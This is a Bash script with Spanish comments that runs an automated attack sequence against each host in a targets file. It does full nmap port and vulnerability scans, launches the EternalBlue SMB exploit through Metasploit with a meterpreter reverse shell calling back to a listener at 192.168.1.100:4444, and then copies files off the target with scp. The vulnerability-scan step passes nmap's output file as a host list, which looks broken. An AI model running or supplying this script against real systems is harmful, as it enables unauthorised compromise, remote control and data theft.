#!/bin/bash

# Verificar si el archivo de objetivos existe
if [ ! -f targets.txt ]; then
    echo "El archivo targets.txt no existe."
    exit 1
fi

# Leer cada objetivo del archivo y ejecutar la secuencia de ataques
while IFS= read -r objetivo; do
    echo "[+] Ejecutando secuencia de ataques en $objetivo..."

    # Paso 1: Escaneo de puertos
    echo "[+] Escaneando puertos en $objetivo..."
    nmap -p 1-65535 -T4 -A -v $objetivo > nmap_$objetivo.txt

    # Paso 2: Buscar vulnerabilidades con NSE Vulscan
    echo "[+] Buscando vulnerabilidades en $objetivo..."
    nmap --script vulscan/vulscan.nse -iL nmap_$objetivo.txt -oN vulscan_$objetivo.txt

    # Paso 3: Intento de explotación con Metasploit
    echo "[+] Intentando explotación en $objetivo..."
    msfconsole -q -x "
    use exploit/windows/smb/ms17_010_eternalblue;
    set RHOST $objetivo;
    set PAYLOAD windows/x64/meterpreter/reverse_tcp;
    set LHOST 192.168.1.100;
    set LPORT 4444;
    exploit;
    exit;"
    
    # Paso 4: Exfiltración de datos (simulado con SCP)
    echo "[+] Exfiltrando archivos desde $objetivo..."
    scp usuario@$objetivo:/ruta/al/archivo/de/interés.txt /ruta/local/$objetivo.txt

    echo "[+] Secuencia completada para $objetivo."
done < targets.txt

echo "[+] Secuencias de ataque completadas para todos los objetivos."
